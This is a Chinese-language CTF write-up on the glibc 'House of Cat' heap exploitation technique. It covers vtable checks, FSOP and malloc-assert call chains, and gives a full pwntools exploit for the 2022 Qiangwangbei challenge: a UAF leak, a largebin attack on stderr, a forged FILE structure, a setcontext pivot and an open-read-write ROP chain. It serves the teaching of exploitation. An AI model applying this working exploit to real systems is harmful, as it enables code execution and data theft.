---
title: House of Cat
date: '2025-09-29 14:38:12'
updated: '2025-12-29 12:35:49'
---
时隔几个月，总算再来看这个 house 系列了...估计动调起来也生疏了...

## vtable 检查
在glibc2.24以后加入了对虚函数的检测，在调用虚函数之前首先会检查虚函数地址的合法性

```c
void _IO_vtable_check (void) attribute_hidden;
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
    uintptr_t section_length = __stop___libc_IO_vtables -__start___libc_IO_vtables;
    uintptr_t ptr = (uintptr_t) vtable;
    uintptr_t offset = ptr -(uintptr_t)__start___libc_IO_vtables;
    if (__glibc_unlikely (offset >= section_length))
        _IO_vtable_check ();
    return vtable;
}
```

其检查流程为：计算_IO_vtable 段的长度（section_length），用当前虚表指针的地址减去_IO_vtable 段的开始地址，如果vtable相对于开始地址的偏移大于等于section_length，那么就会进入_IO_vtable_check进行更详细的检查，否则的话会正常调用。如果vtable是非法的，进入_IO_vtable_check函数后会触发abort

虽然对vtable的检查较为严格，但是对于具体位置和具体偏移的检测则是较为宽松的，可以修改vtable指针为虚表段内的任意位置，也就是对于某一个_IO_xxx_jumps的任意偏移，使得其调用攻击者想要调用的IO函数

> 其实就是改 vtable 不能改到 vtable 段之外的地址，但是篡改 file_jumps 变成 wfile_jumps 还是不受影响的
>

## 关键利用
劫持 malloc函数里面可能调用到的 IO 函数从而劫持执行流

### house of kiwi 思路
首先先看看 _int_malloc（malloc 的内部函数）：

_int_malloc 里面所有的报错字符串都通过 malloc_printerr 函数输出

![](/images/358e3d162ab1f388f21137f8bbc96f5d.png)

这个函数是直接调用了 libc 里面的 message 函数来打印，没有用到 IO 函数

关键在于函数 __malloc_assert 函数：

这个函数也叫 __assert_fail，是在 malloc 相关 assert 失败时调用的

![](/images/6a6967d3ff83a095e7b455597118484e.png)

这里面直接调用了 IO 函数 __fxprintf，可以被劫持

接下来就看看 _int_malloc 里面有哪些函数调用了 assert

看到 sysmalloc 里面：

![](/images/b38a44d3583fd12ba61916d56d99c85f.png)

第一个 assert

这个 assert 用来检查 topchunk 的属性：

检查是否初始化、是否小于最小值、prev_inuse 是否为 1、topchunk 末尾是否页对齐

所以要让 assert fail 的话在 topchunk 的 size 下手就行了

调用链：

```c
malloc()
    _int_malloc
        sysmalloc
            assert
                __malloc_assert
                    __fxprintf
                        //这里就是从vtable取的函数了，在vtable中取的是0x38偏移的函数__seekoff
                        __wfile_seekoff
```

### FSOP 思路
所有 _IO_FILE 结构通过 _chain 连接成一个单链表，头部是 _IO_list_all

FSOP 就是劫持 _IO_list_all，从而在执行 _IO_flush_all_lockp 时候调用到 vtable 的 _IO_OVERFLOW

调用到 _IO_flush_all_lockp 有三种情况：

+ 从 main 函数返回
+ 程序中执行 exit
+ libc 中执行 abort（高版本中已经删除，__malloc_assert 也可以）

具体调用链：

```c
main_ret & exit() & __malloc_assert
    _IO_flush_all_lockp
        // 篡改vtable -> _IO_wfile_jumps
        _IO_wfile_seekoff
            _IO_switch_to_wget_mode
                _IO_WOVERFLOW
```

其中在调用宏定义的_IO_WOVERFLOW 之前的_IO_switch_to_wget_mode 还有一些汇编指令：

```c
0x7ffff7c83cb4 <_IO_switch_to_wget_mode+4>      mov    rax, qword ptr [rdi + 0xa0]
0x7ffff7c83cbb <_IO_switch_to_wget_mode+11>     push   rbx
0x7ffff7c83cbc <_IO_switch_to_wget_mode+12>     mov    rbx, rdi
0x7ffff7c83cbf <_IO_switch_to_wget_mode+15>     mov    rdx, qword ptr [rax + 0x20]
0x7ffff7c83cc3 <_IO_switch_to_wget_mode+19>     cmp    rdx, qword ptr [rax + 0x18]
0x7ffff7c83cc7 <_IO_switch_to_wget_mode+23>     jbe    _IO_switch_to_wget_mode+56
0x7ffff7c83cc9 (_IO_switch_to_wget_mode+25) ◂— mov rax, qword ptr [rax + 0xe0]
0x7ffff7c83cd5 (_IO_switch_to_wget_mode+37) ◂— call qword ptr [rax + 0x18]
```

有两种调用思路：

1. 开启沙箱：我们可以把最后调用的[rax + 0x18]设置为 setcontext ，把rdx设置为可控的堆地址，就能执行srop读取flag；
2. 未开启沙箱：则只需把最后调用的[rax + 0x18]设置为 system 函数，把 fake_IO 的头部（即rdi）写入/bin/sh字符串，就可执行system("/bin/sh")

## 2022 强网杯 house of cat
略过前面的一些检查，直接来看增删查改的部分吧：

![](/images/1d8ab58839e0cf7b54fab9c2a92dcb55.png)

这里的 add 限制了 chunk 的数量不超过 16 个，而且 size 也限制了只能在 0x417 和 0x46f 之间，也就是 largechunk 的大小

![](/images/6e0a71c3982a093bd7b3e4e1f73fbca8.png)

delete 函数没有把指针置零，存在 UAF 漏洞

![](/images/cf528ed7d7b33869430bd4aea57a51ca.png)

show 函数用的 write 函数输出

![](/images/d00422a1aaec55c54a20a5bf7255f902.png)

修改的机会只有一次，次数放在 bss 段，而且也只能修改 chunk 的前 0x30 字节

这题估计跟 fastbin 和 tcachebin 没什么关系了，edit 的 0x30 字节也就不会产生溢出

看了几天资料，加上一整天来复现总算复现出来了

### 思路
题目有 UAF，而且只能申请 largechunk，而且 show 函数不会被 \x00 截断，所以可以直接同时泄露出 libc 地址和 heap 地址

```python
#----- UAF leak libc & heap -----
free(0)
add(3,0x440,b'3') # chunk0 into largebin
show(0)
link.recvuntil(b'Context:\n')
largechunk=u64(link.recv(6).ljust(8,b'\x00'))
# success("largebin: "+hex(largebin))
libc_base=largechunk-0x21a0d0
success("libc_base: "+hex(libc_base))
link.recv(10)
heap=u64(link.recv(6).ljust(8,b'\x00'))
# success("heap: "+hex(heap))
heap_base=heap-0x290
success("heap_base: "+hex(heap_base))
```

#### IO 链条
```python
_int_malloc
	sysmalloc
		assert
			__fxprintf 
				# 劫持vtable改成wfile_jumps
				__xsputn -> _IO_wfile_seekoff
					_IO_switch_to_wget_mode
						_IO_WOVERFLOW
```

其中劫持到_IO_wfile_seekoff 之后要执行到_IO_switch_to_wget_mode 的条件和

_IO_switch_to_wget_mode 要执行 _IO_WOVERFLOW 的条件都是：

```c
fp->_wide_data->_IO_write_ptr > fp->_wide_data->_IO_write_base
```

![](/images/349e7f303c56f5d28a8cffcba48c0271.png)

![](/images/68bffbb9cba2387eab7a503d2fb16793.png)

#### 伪造的 fake_io_file
```python
#---- fake_io_file -----
fake_io_file=flat({
    0x40:p64(fake_io_addr+0x78), #_IO_switch_to_wget_mode -> mov rdx,[addr]，后续rdx是高版本setcontext的关键寄存器
    0x48:p64(setcontext+61), #_IO_switch_to_wget_mode -> call_addr
    0x78:p64(heap_base+0x200), #lock
    0x90:p64(fake_wide_data_addr), #wide_data
    0xc8:p64(wfile_jumps+0x10), #vtable -> wfile_jumps+10
    0x100:p64(fake_wide_data_addr+0x10), #_IO_switch_to_wget_mode -> rax
    0x108:p64(rop_addr), #setcontext
    0x110:p64(ret) #setcontext
},filler=b"\x00")
free(2)
add(4,0x418,fake_io_file) #提前准备好fakeiofile
```

按照执行流的顺序来解释这个 fake_io_file（别忘了这个 fake_io_file 是从 size 域开始的）：

1. 前提：<font style="background-color:#FBDE28;">0x78</font> 对应了 file 的 _lock，得是可读写内存
2. <font style="background-color:#FBDE28;">0xc8</font> 对应替换了 stderr 的 vtable，改成了 wfile_jumps+0x10，让原本解释 __xsputn 变成了 _IO_wfile_seekoff
3. _IO_wfile_seekoff 里面是_IO_switch_to_wget_mode ，里面的开头几个指令：

![](/images/71a50ec36cde83c40c4a801e9a83c020.png)

这里 rdi 是 fake_io_file 的地址，

这里定的 fake_wide_data 是在 largechunk 的 bk_nextsize 之后的（也就是 fake_io_addr+0x30）

4. 第一句是从 <font style="background-color:#FBDE28;">0x90</font> 的位置取 wide_data，
5. 第四、五句比较_IO_write_ptr 和_IO_write_base，这时的 rdx (_IO_write_ptr) 是从 <font style="background-color:#FBDE28;">0x40</font> 的位置取的，_IO_write_base 对应的是 <font style="background-color:#FBDE28;">0x38</font> 的位置
6. 第七句将 <font style="background-color:#FBDE28;">0x100</font> 位置的 fake_wide_data+0x10 给到 rax

> 细节：加 0x10 是因为后面 call 的时候是按照 rax +偏移 的，不加 0x10 的话 setcontext+61 正好在_IO_write_base 也就是 <font style="background-color:#FBDE28;">0x38</font> 的位置，因为setcontext+61 是 libc 地址，而 fake_io_addr+0x78 是 heap 地址，libc 地址比 heap 地址大，没法满足_IO_write_ptr > _IO_write_base
>

7. 第九句 call 了 <font style="background-color:#FBDE28;">0x48</font> 位置的 setcontext+61，这时候的 rdx 是fake_io_addr+0x78

> 接着讲讲这个 setcontext，一般都是从这里开始用的：
>
> ![](/images/ab84b8823f553e9bd6622b829d56407b.png)
>
> ![](/images/fecbe2ab1cba2057539eaa127544c6fa.png)
>

8. 框住的第一句是将 <font style="background-color:#FBDE28;">0x108</font> 位置的 rop_addr 赋给 rsp，实现了栈迁移
9. 框住的第二句是将 <font style="background-color:#FBDE28;">0x110</font> 位置的 ret push 到栈顶，后面 retn 就先到 ret，接着就执行到了 rop 链

> 题目没有开沙箱的话可以把 setcontext+61 改成 system，然后在 iofile 开头写上"./flag"字符就行了
>

#### ROP
这题的沙盒配置：

![](/images/8a460375499ee091a7f9c0d7ef846630.png)

只允许 open、read、write、getrandom、mmap、close、brk、exit_group，

并且 read 只允许用 fd=0

所以第一件事是先把 fd 0 给腾出来给 flag 文件，先 close(0)，然后再 orw 就可以了

还有一个点是不能用 libc 里面的 open 函数，因为 open 函数实际上用的是 openat 系统调用，而不是 open 系统调用，会被沙盒 ban 掉

```python
rop=p64(rdi)+p64(0)+p64(close) #close(0)
rop+=p64(rdi)+p64(flag_addr)+p64(rax)+p64(2)+p64(syscall) #open("./flag",0,0)
rop+=p64(rdi)+p64(0)+p64(rsi)+p64(flag_addr+0x10)+p64(rdx_r12)+p64(0x100)+p64(0)+p64(read) #read(0,flag_addr+0x10,0x100)
rop+=p64(rdi)+p64(flag_addr+0x10)+p64(puts) #puts(flag_addr+0x10)
add(8,0x430,rop)
```

### 完整 EXP
```python
#!/usr/bin/env python3

from pwn import *
context.log_level = 'debug'
context.arch = 'amd64'

link=process("./houseofcat")
# link=remote('36.212.14.99',27719)
elf=ELF("./houseofcat")
libc=ELF("/home/pwner/glibc-all-in-one/libs/2.35-0ubuntu3_amd64/libc.so.6")

gdb.attach(link,'b* (_IO_wfile_seekoff)')
pause()

def cat(choice):
    link.sendafter("mew mew mew~~~~~~\n","CAT | r00t QWB QWXF$\xff\xff\xff\xff")
    link.sendlineafter("plz input your cat choice:\n",str(choice))

def add(idx,size,content):
    cat(1)
    link.sendlineafter(":",str(idx))
    link.sendlineafter(":",str(size))
    link.sendafter(":",content)

def show(idx):
    cat(3)
    link.sendlineafter(":",str(idx))

def free(idx):
    cat(2)
    link.sendlineafter(":",str(idx))

def edit(idx,content):
    cat(4)
    link.sendlineafter(":",str(idx))
    link.sendafter(":",content)

link.send("LOGIN | r00t QWB QWXFadmin")
add(0,0x420,b'0')
add(1,0x430,b'1')
add(2,0x418,b'2')

#----- UAF leak libc & heap -----
free(0)
add(3,0x440,b'3') # chunk0 into largebin
show(0)
link.recvuntil(b'Context:\n')
largechunk=u64(link.recv(6).ljust(8,b'\x00'))
# success("largebin: "+hex(largebin))
libc_base=largechunk-0x21a0d0
success("libc_base: "+hex(libc_base))
link.recv(10)
heap=u64(link.recv(6).ljust(8,b'\x00'))
# success("heap: "+hex(heap))
heap_base=heap-0x290
success("heap_base: "+hex(heap_base))

#---- addrs -----
stderr=libc_base+libc.sym['stderr']
success("stderr: "+hex(stderr))
wfile_jumps=libc_base+libc.symbols['_IO_wfile_jumps']
fake_io_addr=heap_base+0x290+0x430+0x440
# success("fake_io_addr: "+hex(fake_io_addr))
fake_wide_data_addr=fake_io_addr+0x30
setcontext=libc_base+libc.sym['setcontext']
ret=libc_base+0x0000000000029cd6
rop_addr=heap_base+0x2050

#---- fake_io_file -----
fake_io_file=flat({
    0x40:p64(fake_io_addr+0x78), #_IO_switch_to_wget_mode -> mov rdx,[addr]，后续rdx是高版本setcontext的关键寄存器
    0x48:p64(setcontext+61), #_IO_switch_to_wget_mode -> call_addr
    0x78:p64(heap_base+0x200), #lock
    0x90:p64(fake_wide_data_addr), #wide_data
    0xc8:p64(wfile_jumps+0x10), #vtable -> wfile_jumps+10
    0x100:p64(fake_wide_data_addr+0x10), #_IO_switch_to_wget_mode -> rax
    0x108:p64(rop_addr), #setcontext
    0x110:p64(ret) #setcontext
},filler=b"\x00")
free(2)
add(4,0x418,fake_io_file) #提前准备好fakeiofile

#----- largebin attack stderr -----
free(4)
edit(0,p64(largechunk)+p64(largechunk)+p64(heap_base+0x290)+p64(stderr-0x20))
add(5,0x440,b'55555') # 触发largebin attack，顺便这个当作第二次largebin attack的victim
add(6,0x430,b'./flag')
add(7,0x430,b'77777')

#----- rop_chain -----
rdi=libc_base+0x000000000002a3e5
rsi=libc_base+0x000000000002be51
rdx_r12=libc_base+0x000000000011f497
rax=libc_base+0x0000000000045eb0

syscall=libc_base+0x0000000000091396
read=libc_base+libc.sym['read']
puts=libc_base+libc.sym['puts']
close=libc_base+libc.sym['close']
flag_addr=heap_base+0x17d0

rop=p64(rdi)+p64(0)+p64(close) #close(0)
rop+=p64(rdi)+p64(flag_addr)+p64(rax)+p64(2)+p64(syscall) #open("./flag",0,0)
rop+=p64(rdi)+p64(0)+p64(rsi)+p64(flag_addr+0x10)+p64(rdx_r12)+p64(0x100)+p64(0)+p64(read) #read(0,flag_addr+0x10,0x100)
rop+=p64(rdi)+p64(flag_addr+0x10)+p64(puts) #puts(flag_addr+0x10)
add(8,0x430,rop)

#----- largebin attack topchunksize -----
free(5) # chunk5 > chunk7
add(9,0x450,b'999999') # chunk5进largebin
free(7) #进unsortedbin
topchunk_size_addr=heap_base+0x28e0+3
edit(5,p64(largechunk+0x10)+p64(largechunk+0x10)+p64(heap_base+0x1370)+p64(topchunk_size_addr-0x20))

# pause()
cat(1)
link.sendlineafter(":",str(10))
link.sendlineafter(":",str(0x450))

link.interactive()
```

